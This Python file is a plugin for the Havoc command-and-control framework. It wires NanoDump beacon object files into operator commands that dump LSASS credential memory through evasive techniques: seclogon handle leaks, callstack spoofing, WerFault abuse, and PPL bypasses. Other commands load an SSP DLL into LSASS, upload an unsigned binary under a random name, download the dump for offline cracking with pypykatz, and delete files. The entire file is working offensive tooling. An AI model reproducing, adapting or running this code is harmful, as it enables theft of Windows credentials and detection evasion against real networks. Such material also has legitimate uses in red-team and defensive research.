import traceback
import time
import random
import string

from pyhavoc.core  import *
from pyhavoc.ui    import *
from pyhavoc.agent import *
from os.path       import exists, dirname, basename

CURRENT_DIR  = dirname( __file__ )
CACHE_OBJECT = False

##
## this are some util functions and the NanoDumpTaskBase
## base object which every nanodump command will inherit
##

def file_read( path: str ) -> bytes:
    handle    = open( path, 'rb' )
    obj_bytes = handle.read()
    handle.close()
    return obj_bytes


def generate_rand_string( min_length: int, max_length: int ) -> str:
    length = random.randint( min_length, max_length )
    return ''.join( random.choices( string.ascii_letters + string.digits, k=length ) )


def is_full_path( path: str ) -> bool:
    if len( path ) < 3:
        return False
    # check for drive letter pattern: X:\ or X:/
    if path[0].isalpha() and path[1] == ':' and path[2] in ('\\', '/'):
        return True
    return False


@KnRegisterCommand( command     = 'restore_signature',
                    description = 'restore valid minidump signature for pypykatz',
                    group       = 'NanoDump Commands' )
class ObjectRestoreSignatureTask( HcKaineCommand ):

    @staticmethod
    def arguments( parser ):
        parser.epilog = (
            "   Restores the valid MDMP signature to an invalid nanodump file.\n"
            "   Use this after downloading a dump created without --valid.\n"
        )

        parser.add_argument( 'filepath', type=str, help='path to dump file' )

    async def execute( self, args ):
        if not exists( args.filepath ):
            self.log_error( f'file not found: {args.filepath}' )
            return

        with open( args.filepath, 'r+b' ) as f:
            f.seek( 0 )
            f.write( bytes( [ 0x4d, 0x44, 0x4d, 0x50, 0x93, 0xa7, 0x00, 0x00 ] ) )

        self.log_success( f'restored signature: {args.filepath}' )
        self.log_info( f'to analyze: python3 -m pypykatz lsa minidump {args.filepath}' )


class NanoDumpTaskBase( HcKaineCommand ):

    def __init__( self, *args, **kwargs ):
        super().__init__( *args, **kwargs )

        self.capture_output = False

        name = self.command()

        self.bof_path = f"{dirname(__file__)}/dist/{name}.{self.agent().agent_meta()['arch']}.o"
        self.key_id   = f'obj-nd-handle.{name}'

    async def execute( self, args ):
        return await self.execute_object()

    async def execute_object( self, *args, argv: bytes = None, description = '' ):
        if exists( self.bof_path ) is False:
            self.log_error( f"object file not found: {self.bof_path}" )
            return

        #
        # execute the already loaded object file if we
        # have it loaded + CACHE_OBJECT is still enabled
        #
        if self.key_id in self.agent().key_store and CACHE_OBJECT:
            task = self.agent().object_invoke(
                self.agent().key_store[ self.key_id ],
                'go',
                *args,
                object_argv  = argv,
                flag_capture = self.capture_output
            )
        else:
            task = self.agent().object_execute(
                file_read( self.bof_path ),
                'go',
                *args,
                object_argv  = argv,
                flag_cache   = CACHE_OBJECT,
                flag_capture = self.capture_output
            )

        uuid    = format( task.task_uuid(), 'x' )
        message = description

        #
        # this displays the informational message of the task being created
        # by either using the given execute_object description or use the
        # registered command description
        #
        if len( message ) == 0:
            message = self.description()
            if CACHE_OBJECT:
                message += ' (with caching enabled)'

            task.set_description( message )

        self.log_info( f'({uuid}) {message}' )

        #
        # now invoke and issue the task to the agent and wait for it to finish
        #
        try:
            result = await task.result()

            if CACHE_OBJECT and self.key_id not in self.agent().key_store:
                #
                # looks like we are not in the store meaning that the previously send
                # out task should be caching the object into memory and return us the handle
                #
                handle, output = result
                message        = f'(handle: 0x{handle:x})'

                self.agent().key_store[ self.key_id ] = handle
            else:
                #
                # normally wait for the object file to finish!
                #
                message = ''
                handle, output = 0, ''

                if len( result ) == 1:
                    output = result
                elif len( result ) == 2:
                    handle, output = result

            if len( output ) > 0 and self.capture_output:
                self.process_output( output, task.task_uuid() )
            elif self.capture_output:
                self.log_warn( f'{self.command()} has sent no output back!', task_id = task.task_uuid() )
        except Exception as e:
            self.log_error( f"({uuid}) failed to execute {self.command()}: {e}", task_id = task.task_uuid() )
            print( traceback.format_exc() )
            if str( e ) == 'STATUS_NOT_FOUND':
                self.log_warn( f'removing key store entry of {self.command()}' )
                del self.agent().key_store[ self.key_id ]
            return

        self.log_success( f"({uuid}) successfully executed {self.command()} {message}", task_id = task.task_uuid() )

    def process_output( self, output: str, task_id: int ):
        self.log_success( f'received output from {self.command()} [{len(output)} bytes]:', task_id = task_id )
        self.log_raw( output.decode(), task_id = task_id )
        return


##
## nanodump main command
##

@KnRegisterCommand( command     = 'nanodump',
                    description = 'use syscalls to dump LSASS',
                    group       = 'NanoDump Commands' )
class ObjectNanoDumpTask( NanoDumpTaskBase ):

    @staticmethod
    def arguments( parser ):
        parser.epilog = (
            "Dumpfile options:\n"
            "   --write, -w          filename of the dump\n"
            "   --valid, -v          create a dump with a valid signature\n\n"
            "Obtain an LSASS handle via:\n"
            "   --duplicate, -d      duplicate a high privileged existing LSASS handle\n"
            "   --duplicate-elevate, -de\n"
            "                        duplicate a low privileged existing LSASS handle and elevate it\n"
            "   --seclogon-leak-local, -sll\n"
            "                        leak an LSASS handle into nanodump via seclogon\n"
            "   --seclogon-leak-remote, -slr BIN_PATH\n"
            "                        leak an LSASS handle into another process via seclogon\n"
            "   --seclogon-duplicate, -sd\n"
            "                        make seclogon open a handle to LSASS and duplicate it\n"
            "   --spoof-callstack, -sc\n"
            "                        open a handle to LSASS using a fake calling stack\n\n"
            "Let WerFault.exe create the dump:\n"
            "   --silent-process-exit, -spe DUMP_FOLDER\n"
            "                        force WerFault.exe to dump LSASS via SilentProcessExit\n"
            "   --shtinkering, -sk   force WerFault.exe to dump LSASS via Shtinkering\n\n"
            "Avoid reading LSASS directly:\n"
            "   --fork, -f           fork the target process before dumping\n"
            "   --snapshot, -s       snapshot the target process before dumping\n\n"
            "Avoid opening a handle with high privileges:\n"
            "   --elevate-handle, -eh\n"
            "                        open a handle with low privileges and duplicate to elevate\n\n"
            "Miscellaneous:\n"
            "   --getpid             print the PID of LSASS and leave\n"
            "   --pid, -p PID        set the PID of LSASS manually\n"
            "   --chunk-size SIZE    chunk size in KiB for fileless exfil (default: 900)\n"
            "   --download           download the dump after writing (requires --write)\n"
            "   --upload             upload nanodump binary for seclogon-leak-local\n"
        )

        # dumpfile options
        parser.add_argument( '--write', '-w', dest='write', default='', type=str, help='filename of the dump' )
        parser.add_argument( '--valid', '-v', dest='valid', action='store_true', help='create a dump with a valid signature' )

        # handle acquisition methods
        parser.add_argument( '--duplicate', '-d', dest='duplicate', action='store_true', help='duplicate existing LSASS handle' )
        parser.add_argument( '--duplicate-elevate', '-de', dest='duplicate_elevate', action='store_true', help='duplicate and elevate handle' )
        parser.add_argument( '--seclogon-leak-local', '-sll', dest='seclogon_leak_local', action='store_true', help='leak handle via seclogon locally' )
        parser.add_argument( '--seclogon-leak-remote', '-slr', dest='seclogon_leak_remote', default='', type=str, help='leak handle via seclogon to remote binary' )
        parser.add_argument( '--seclogon-duplicate', '-sd', dest='seclogon_duplicate', action='store_true', help='seclogon race condition' )
        parser.add_argument( '--spoof-callstack', '-sc', dest='spoof_callstack', action='store_true', help='spoof the calling stack' )

        # werfault methods
        parser.add_argument( '--silent-process-exit', '-spe', dest='silent_process_exit', default='', type=str, help='dump folder for SilentProcessExit' )
        parser.add_argument( '--shtinkering', '-sk', dest='shtinkering', action='store_true', help='use Shtinkering technique' )

        # avoid reading lsass directly
        parser.add_argument( '--fork', '-f', dest='fork', action='store_true', help='fork target process before dumping' )
        parser.add_argument( '--snapshot', '-s', dest='snapshot', action='store_true', help='snapshot target process before dumping' )

        # avoid high privilege handle
        parser.add_argument( '--elevate-handle', '-eh', dest='elevate_handle', action='store_true', help='elevate low privilege handle' )

        # misc
        parser.add_argument( '--getpid', dest='getpid', action='store_true', help='print PID of LSASS and leave' )
        parser.add_argument( '--pid', '-p', dest='pid', default=0, type=int, help='PID of LSASS' )
        parser.add_argument( '--chunk-size', dest='chunk_size', default=900, type=int, help='chunk size in KiB (default: 900)' )
        parser.add_argument( '--download', dest='download', action='store_true', help='download the dump after writing' )
        parser.add_argument( '--upload', dest='upload', action='store_true', help='upload nanodump binary for seclogon-leak-local' )

    async def execute( self, args ):
        #
        # check architecture
        #
        if self.agent().agent_meta()['arch'] == 'x86':
            self.log_error( 'nanodump does not support x86' )
            return

        #
        # reading lsass requires elevated privileges
        #
        if not self.agent().agent_meta()['elevated']:
            self.log_error( 'you need to be admin to run nanodump' )
            return

        #
        # shtinkering requires SYSTEM
        #
        if args.shtinkering:
            user = self.agent().agent_meta().get( 'user', '' )
            if 'SYSTEM' not in user.upper():
                self.log_error( 'you must be SYSTEM to run the Shtinkering technique' )
                return

        #
        # validate mutually exclusive options
        #
        if args.getpid:
            if args.write or args.valid or args.snapshot or args.fork or args.elevate_handle or \
               args.duplicate_elevate or args.seclogon_duplicate or args.spoof_callstack or \
               args.seclogon_leak_local or args.seclogon_leak_remote or args.duplicate or \
               args.silent_process_exit or args.shtinkering:
                self.log_error( 'the parameter --getpid is used alone' )
                return

        if args.silent_process_exit:
            if args.write or args.valid or args.snapshot or args.fork or args.elevate_handle or \
               args.duplicate_elevate or args.seclogon_duplicate or args.spoof_callstack or \
               args.seclogon_leak_local or args.seclogon_leak_remote or args.duplicate or args.shtinkering:
                self.log_error( 'the parameter --silent-process-exit is used alone' )
                return

        if args.fork and args.snapshot:
            self.log_error( 'the options --fork and --snapshot cannot be used together' )
            return

        if args.duplicate and args.elevate_handle:
            self.log_error( 'the options --duplicate and --elevate-handle cannot be used together' )
            return

        if args.duplicate_elevate and args.spoof_callstack:
            self.log_error( 'the options --duplicate-elevate and --spoof-callstack cannot be used together' )
            return

        if args.duplicate and args.spoof_callstack:
            self.log_error( 'the options --duplicate and --spoof-callstack cannot be used together' )
            return

        if args.duplicate and args.seclogon_duplicate:
            self.log_error( 'the options --duplicate and --seclogon-duplicate cannot be used together' )
            return

        if args.elevate_handle and args.duplicate_elevate:
            self.log_error( 'the options --elevate-handle and --duplicate-elevate cannot be used together' )
            return

        if args.duplicate_elevate and args.duplicate:
            self.log_error( 'the options --duplicate-elevate and --duplicate cannot be used together' )
            return

        if args.duplicate_elevate and args.seclogon_duplicate:
            self.log_error( 'the options --duplicate-elevate and --seclogon-duplicate cannot be used together' )
            return

        if args.elevate_handle and args.seclogon_duplicate:
            self.log_error( 'the options --elevate-handle and --seclogon-duplicate cannot be used together' )
            return

        if args.duplicate and args.seclogon_leak_local:
            self.log_error( 'the options --duplicate and --seclogon-leak-local cannot be used together' )
            return

        if args.duplicate_elevate and args.seclogon_leak_local:
            self.log_error( 'the options --duplicate-elevate and --seclogon-leak-local cannot be used together' )
            return

        if args.elevate_handle and args.seclogon_leak_local:
            self.log_error( 'the options --elevate-handle and --seclogon-leak-local cannot be used together' )
            return

        if args.duplicate and args.seclogon_leak_remote:
            self.log_error( 'the options --duplicate and --seclogon-leak-remote cannot be used together' )
            return

        if args.duplicate_elevate and args.seclogon_leak_remote:
            self.log_error( 'the options --duplicate-elevate and --seclogon-leak-remote cannot be used together' )
            return

        if args.elevate_handle and args.seclogon_leak_remote:
            self.log_error( 'the options --elevate-handle and --seclogon-leak-remote cannot be used together' )
            return

        if args.seclogon_leak_local and args.seclogon_leak_remote:
            self.log_error( 'the options --seclogon-leak-local and --seclogon-leak-remote cannot be used together' )
            return

        if args.seclogon_leak_local and args.seclogon_duplicate:
            self.log_error( 'the options --seclogon-leak-local and --seclogon-duplicate cannot be used together' )
            return

        if args.seclogon_leak_local and args.spoof_callstack:
            self.log_error( 'the options --seclogon-leak-local and --spoof-callstack cannot be used together' )
            return

        if args.seclogon_leak_remote and args.seclogon_duplicate:
            self.log_error( 'the options --seclogon-leak-remote and --seclogon-duplicate cannot be used together' )
            return

        if args.seclogon_leak_remote and args.spoof_callstack:
            self.log_error( 'the options --seclogon-leak-remote and --spoof-callstack cannot be used together' )
            return

        if args.seclogon_duplicate and args.spoof_callstack:
            self.log_error( 'the options --seclogon-duplicate and --spoof-callstack cannot be used together' )
            return

        if args.shtinkering and args.fork:
            self.log_error( 'the options --shtinkering and --fork cannot be used together' )
            return

        if args.shtinkering and args.snapshot:
            self.log_error( 'the options --shtinkering and --snapshot cannot be used together' )
            return

        if args.shtinkering and args.valid:
            self.log_error( 'the options --shtinkering and --valid cannot be used together' )
            return

        if args.shtinkering and args.write:
            self.log_error( 'the options --shtinkering and --write cannot be used together' )
            return

        #
        # validate seclogon-leak-local requirements
        #
        if not args.shtinkering and args.seclogon_leak_local and not args.write:
            self.log_error( 'if --seclogon-leak-local is being used, you need to provide the dump path with --write' )
            return

        if not args.shtinkering and args.seclogon_leak_local and args.write and not is_full_path( args.write ):
            self.log_error( f'if --seclogon-leak-local is being used, you need to provide the full path: {args.write}' )
            return

        #
        # validate seclogon-leak-remote path
        #
        if args.seclogon_leak_remote and not is_full_path( args.seclogon_leak_remote ):
            self.log_error( f'you must provide a full path: {args.seclogon_leak_remote}' )
            return

        #
        # set up variables
        #
        pid = args.pid
        write_file = 1 if args.write else 0
        dump_path = args.write.replace( '/', '\\' ) if args.write else f"lsass_{int(time.time())}.dmp"
        chunk_size = args.chunk_size * 1024
        use_valid_sig = 1 if args.valid else 0
        fork = 1 if args.fork else 0
        snapshot = 1 if args.snapshot else 0
        dup = 1 if args.duplicate else 0
        elevate_handle = 1 if args.elevate_handle else 0
        duplicate_elevate = 1 if args.duplicate_elevate else 0
        get_pid = 1 if args.getpid else 0
        use_seclogon_leak_local = 1 if args.seclogon_leak_local else 0
        use_seclogon_leak_remote = 1 if args.seclogon_leak_remote else 0
        seclogon_leak_remote_binary = args.seclogon_leak_remote
        use_seclogon_duplicate = 1 if args.seclogon_duplicate else 0
        spoof_callstack = 1 if args.spoof_callstack else 0
        use_silent_process_exit = 1 if args.silent_process_exit else 0
        silent_process_exit = args.silent_process_exit
        use_lsass_shtinkering = 1 if args.shtinkering else 0

        #
        # handle seclogon_leak_local (needs to upload nanodump binary)
        #
        if args.seclogon_leak_local:
            folder = "C:\\Windows\\Temp"
            seclogon_leak_remote_binary = f"{folder}\\{generate_rand_string(5, 10)}.exe"

            if args.upload:
                self.log_warn( f'an unsigned nanodump binary will be uploaded to: {seclogon_leak_remote_binary}' )

                exe_path = f"{dirname(__file__)}/dist/nanodump.{self.agent().agent_meta()['arch']}.exe"
                if not exists( exe_path ):
                    self.log_error( f'exe file not found: {exe_path}' )
                    return

                exe_data = file_read( exe_path )
                await self.agent().upload_file( exe_data, seclogon_leak_remote_binary, task_wait = True ).result()

        #
        # validate download requirements
        #
        if args.download and not args.write:
            self.log_error( '--download requires --write to specify the dump path' )
            return

        await self.execute_object(
            argv        = bof_pack( 'iziiiiiiiiiiiziiizi',
                                    pid, dump_path, write_file, chunk_size, use_valid_sig,
                                    fork, snapshot, dup, elevate_handle, duplicate_elevate,
                                    get_pid, use_seclogon_leak_local, use_seclogon_leak_remote,
                                    seclogon_leak_remote_binary, use_seclogon_duplicate,
                                    spoof_callstack, use_silent_process_exit, silent_process_exit,
                                    use_lsass_shtinkering ),
            description = 'running nanodump BOF'
        )

        #
        # download the dump if requested
        #
        if args.download and args.write:
            download_path = args.write
            self.log_info( f'downloading dump: {download_path}' )
            await self.agent().download_file( download_path, task_wait = False ).result()


##
## nanodump PPL bypass commands
##

@KnRegisterCommand( command     = 'nanodump_ppl_dump',
                    description = 'bypass PPL and dump LSASS',
                    group       = 'NanoDump Commands' )
class ObjectNanoDumpPPLDumpTask( NanoDumpTaskBase ):

    @staticmethod
    def arguments( parser ):
        parser.epilog = (
            "Dumpfile options:\n"
            "   --write, -w DUMP_PATH   filename of the dump (required, full path)\n"
            "   --valid, -v             create a dump with a valid signature\n"
            "   --download              download the dump after writing\n\n"
            "Obtain an LSASS handle via:\n"
            "   --duplicate, -d         duplicate an existing LSASS handle\n"
        )

        parser.add_argument( '--write', '-w', dest='write', required=True, type=str, help='filename of the dump (full path required)' )
        parser.add_argument( '--valid', '-v', dest='valid', action='store_true', help='create a dump with a valid signature' )
        parser.add_argument( '--duplicate', '-d', dest='duplicate', action='store_true', help='duplicate existing LSASS handle' )
        parser.add_argument( '--download', dest='download', action='store_true', help='download the dump after writing' )

    async def execute( self, args ):
        #
        # check architecture
        #
        if self.agent().agent_meta()['arch'] == 'x86':
            self.log_error( 'nanodump does not support x86' )
            return

        #
        # reading lsass requires elevated privileges
        #
        if not self.agent().agent_meta()['elevated']:
            self.log_error( 'you need to be admin to run nanodump' )
            return

        #
        # validate path
        #
        if not is_full_path( args.write ):
            self.log_error( f'you need to provide the full path: {args.write}' )
            return

        #
        # read the DLL file
        #
        dll_path = f"{dirname(__file__)}/dist/nanodump_ppl_dump.{self.agent().agent_meta()['arch']}.dll"
        if not exists( dll_path ):
            self.log_error( f'DLL file not found: {dll_path}' )
            return

        dll = file_read( dll_path )

        use_valid_sig = 1 if args.valid else 0
        dup = 1 if args.duplicate else 0
        dump_path = args.write.replace( '/', '\\' )

        await self.execute_object(
            argv        = bof_pack( 'ziib', dump_path, use_valid_sig, dup, dll ),
            description = 'running nanodump_ppl_dump BOF'
        )

        #
        # download the dump if requested
        #
        if args.download:
            download_path = args.write.replace( '/', '\\' )
            self.log_info( f'downloading dump: {download_path}' )
            self.agent().download_file( download_path, task_wait = False )


@KnRegisterCommand( command     = 'nanodump_ppl_medic',
                    description = 'bypass PPL and dump LSASS using PPLMedic',
                    group       = 'NanoDump Commands' )
class ObjectNanoDumpPPLMedicTask( NanoDumpTaskBase ):

    @staticmethod
    def arguments( parser ):
        parser.epilog = (
            "Dumpfile options:\n"
            "   --write, -w DUMP_PATH   filename of the dump (required, full path)\n"
            "   --valid, -v             create a dump with a valid signature\n"
            "   --download              download the dump after writing\n\n"
            "Avoid opening a handle with high privileges:\n"
            "   --elevate-handle, -eh   open a handle with low privileges and elevate\n"
        )

        parser.add_argument( '--write', '-w', dest='write', required=True, type=str, help='filename of the dump (full path required)' )
        parser.add_argument( '--valid', '-v', dest='valid', action='store_true', help='create a dump with a valid signature' )
        parser.add_argument( '--elevate-handle', '-eh', dest='elevate_handle', action='store_true', help='elevate low privilege handle' )
        parser.add_argument( '--download', dest='download', action='store_true', help='download the dump after writing' )

    async def execute( self, args ):
        #
        # check architecture
        #
        if self.agent().agent_meta()['arch'] == 'x86':
            self.log_error( 'nanodump does not support x86' )
            return

        #
        # reading lsass requires elevated privileges
        #
        if not self.agent().agent_meta()['elevated']:
            self.log_error( 'you need to be admin to run nanodump' )
            return

        #
        # validate path
        #
        if not is_full_path( args.write ):
            self.log_error( f'you need to provide the full path: {args.write}' )
            return

        #
        # read the DLL file
        #
        dll_path = f"{dirname(__file__)}/dist/nanodump_ppl_medic.{self.agent().agent_meta()['arch']}.dll"
        if not exists( dll_path ):
            self.log_error( f'DLL file not found: {dll_path}' )
            return

        dll = file_read( dll_path )

        use_valid_sig = 1 if args.valid else 0
        elevate_handle = 1 if args.elevate_handle else 0
        dump_path = args.write.replace( '/', '\\' )

        await self.execute_object(
            argv        = bof_pack( 'bzii', dll, dump_path, use_valid_sig, elevate_handle ),
            description = 'running nanodump_ppl_medic BOF'
        )

        #
        # download the dump if requested
        #
        if args.download:
            download_path = args.write.replace( '/', '\\' )
            self.log_info( f'downloading dump: {download_path}' )
            self.agent().download_file( download_path, task_wait = False )


##
## nanodump SSP command
##

@KnRegisterCommand( command     = 'nanodump_ssp',
                    description = 'load a Security Support Provider (SSP) into LSASS',
                    group       = 'NanoDump Commands' )
class ObjectNanoDumpSSPTask( NanoDumpTaskBase ):

    @staticmethod
    def arguments( parser ):
        parser.epilog = (
            "Dumpfile options:\n"
            "   --write, -w DUMP_PATH   filename of the dump (required, full path)\n"
            "   --valid, -v             create a dump with a valid signature\n"
            "   --download              download the dump after writing\n\n"
            "SSP DLL options:\n"
            "   --write-dll, -wdll PATH path where to write the SSP DLL from nanodump\n"
            "   --load-dll, -ldll PATH  load an existing SSP DLL\n"
        )

        parser.add_argument( '--write', '-w', dest='write', required=True, type=str, help='filename of the dump (full path required)' )
        parser.add_argument( '--valid', '-v', dest='valid', action='store_true', help='create a dump with a valid signature' )
        parser.add_argument( '--write-dll', '-wdll', dest='write_dll', default='', type=str, help='path where to write the SSP DLL' )
        parser.add_argument( '--load-dll', '-ldll', dest='load_dll', default='', type=str, help='load an existing SSP DLL' )
        parser.add_argument( '--download', dest='download', action='store_true', help='download the dump after writing' )

    async def execute( self, args ):
        #
        # check architecture
        #
        if self.agent().agent_meta()['arch'] == 'x86':
            self.log_error( 'nanodump does not support x86' )
            return

        #
        # loading an SSP requires elevated privileges
        #
        if not self.agent().agent_meta()['elevated']:
            self.log_error( 'you need to be admin to load an SSP' )
            return

        #
        # validate dump path
        #
        if not is_full_path( args.write ):
            self.log_error( f'you need to provide the full path: {args.write}' )
            return

        #
        # validate DLL options
        #
        if args.load_dll and args.write_dll:
            self.log_error( 'the options --write-dll and --load-dll cannot be used together' )
            return

        if args.load_dll and not is_full_path( args.load_dll ):
            self.log_error( f'you need to provide the full path: {args.load_dll}' )
            return

        #
        # read the DLL file if not loading existing
        #
        dll = b''
        if not args.load_dll:
            self.log_warn( 'writing an unsigned DLL to disk' )
            dll_path = f"{dirname(__file__)}/dist/nanodump_ssp.{self.agent().agent_meta()['arch']}.dll"
            if not exists( dll_path ):
                self.log_error( f'DLL file not found: {dll_path}' )
                return
            dll = file_read( dll_path )

        use_valid_sig = 1 if args.valid else 0
        dump_path = args.write.replace( '/', '\\' )
        write_dll_path = args.write_dll.replace( '/', '\\' ) if args.write_dll else ''
        load_dll_path = args.load_dll.replace( '/', '\\' ) if args.load_dll else ''

        await self.execute_object(
            argv        = bof_pack( 'bzzzi', dll, write_dll_path, load_dll_path, dump_path, use_valid_sig ),
            description = 'running nanodump_ssp BOF'
        )

        #
        # download the dump if requested
        #
        if args.download:
            download_path = args.write.replace( '/', '\\' )
            self.log_info( f'downloading dump: {download_path}' )
            self.agent().download_file( download_path, task_wait = False )


##
## delete file command
##

@KnRegisterCommand( command     = 'delete_file',
                    description = 'delete a file',
                    group       = 'NanoDump Commands' )
class ObjectDeleteFileTask( NanoDumpTaskBase ):

    @staticmethod
    def arguments( parser ):
        parser.add_argument( 'filepath', type=str, help='path to file to delete' )

    async def execute( self, args ):
        #
        # check for WoW64 (x86 beacon on x64 system)
        #
        meta = self.agent().agent_meta()
        if meta['arch'] == 'x86' and meta.get( 'is64', False ):
            self.log_error( 'delete_file does not support WoW64' )
            return

        return await self.execute_object(
            argv        = bof_pack( 'z', args.filepath ),
            description = f"deleting file: {args.filepath}"
        )
